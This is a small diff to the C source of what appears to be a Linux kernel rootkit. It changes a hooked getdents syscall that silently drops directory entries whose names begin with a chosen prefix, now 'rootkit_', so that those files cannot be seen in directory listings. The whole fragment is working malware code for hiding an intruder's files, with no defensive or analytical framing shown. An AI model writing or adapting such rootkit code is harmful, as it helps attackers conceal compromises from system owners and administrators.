@@ -22,7 +22,7 @@ int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 	nread = orig_sys_getdents(fd, dirp, count);
 	for(bpos = 0; bpos < nread ;){
 			dp = (struct linux_dirent *) ((void*)dirp + bpos);
-			if(strncmp(dp->d_name, "rootk_",6) == 0){
+			if(strncmp(dp->d_name, "rootkit_",8) == 0){
 				nread = nread - dp->d_reclen;
 				memcpy((void*)dp, (void*)dp+dp->d_reclen, nread-bpos);
 				continue;
